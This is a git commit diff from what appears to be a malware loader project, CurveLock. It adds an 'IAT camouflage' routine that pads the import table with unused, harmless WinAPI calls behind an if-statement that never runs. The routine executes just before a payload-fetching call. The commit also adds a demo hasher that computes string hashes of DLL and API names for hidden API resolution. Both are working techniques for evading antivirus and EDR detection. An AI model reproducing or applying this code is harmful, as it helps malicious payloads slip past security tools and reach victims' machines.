cd89da2d23c20def9115fbac13453549a8bd3547
Swayam <swayamtejasp@gmail.com>
2025-01-19 09:12:55 -0800

    added iat camo and hasher demo

--- CurveLock/CurveLock.c
+++ CurveLock/CurveLock.c
@@ -2,6 +2,62 @@
 #include <stdio.h>
 #include "common.h"
 
+// Generate a random seed at compile time
+int RandomCompileTimeSeed(void)
+{
+	return '0' * -40271 +
+		__TIME__[7] * 1 +
+		__TIME__[6] * 10 +
+		__TIME__[4] * 60 +
+		__TIME__[3] * 600 +
+		__TIME__[1] * 3600 +
+		__TIME__[0] * 36000;
+}
+
+
+// Helper function that allocates a buffer and returns its base address
+PVOID Helper(PVOID* ppAddress) {
+
+	// Allocating a buffer of 0xFF bytes
+	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
+	if (!pAddress)
+		return NULL;
+
+	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
+	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;
+
+	// saving the base address by pointer, and returning it 
+	*ppAddress = pAddress;
+	return pAddress;
+}
+
+
+// Function that imports WinAPIs but never uses them
+VOID IatCamouflage() {
+
+	PVOID		pAddress = NULL;
+	int* A = (int*)Helper(&pAddress);
+
+	// Impossible if-statement that will never run
+	if (*A > 350) {
+
+		// some random whitelisted WinAPIs
+		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
+		i = GetLastError();
+		i = SetCriticalSectionSpinCount(NULL, NULL);
+		i = GetWindowContextHelpId(NULL);
+		i = GetWindowLongPtrW(NULL, NULL);
+		i = RegisterClassW(NULL);
+		i = IsWindowVisible(NULL);
+		i = ConvertDefaultLocale(NULL);
+		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
+		i = IsDialogMessageW(NULL, NULL);
+	}
+
+	// Freeing the buffer allocated in 'Helper'
+	HeapFree(GetProcessHeap(), 0, pAddress);
+}
+
 // Function to report WinApi Errors
 BOOL ReportError(const char* WinApiName) {
     printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
@@ -9,6 +65,10 @@ BOOL ReportError(const char* WinApiName) {
 }
 
 int main() {
+
+	//Initiate IAT camouflage
+	IatCamouflage();
     //Fetching payload
 	fetchPayload();
+	return 0;
 }
---
+++ hasher/hasher.cpp
@@ -0,0 +1,33 @@
+// hasher.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include <iostream>
+#include <string>
+
+// Simple hash function definition
+unsigned int HASHA(const std::string& str) {
+    unsigned int hash = 0;
+    for (char c : str) {
+        hash = hash * 31 + c;
+    }
+    return hash;
+}
+
+int main()
+{
+    printf("[i] Hash Of \"%s\" Is : 0x%0.8X \n", "USER32.DLL", HASHA("USER32.DLL")); 
+    printf("[i] Hash Of \"%s\" Is : 0x%0.8X \n", "MessageBoxA", HASHA("MessageBoxA"));
+
+    return 0;
+}
+
+// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
+// Debug program: F5 or Debug > Start Debugging menu
+
+// Tips for Getting Started: 
+//   1. Use the Solution Explorer window to add/manage files
+//   2. Use the Team Explorer window to connect to source control
+//   3. Use the Output window to see build output and other messages
+//   4. Use the Error List window to view errors
+//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
+//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
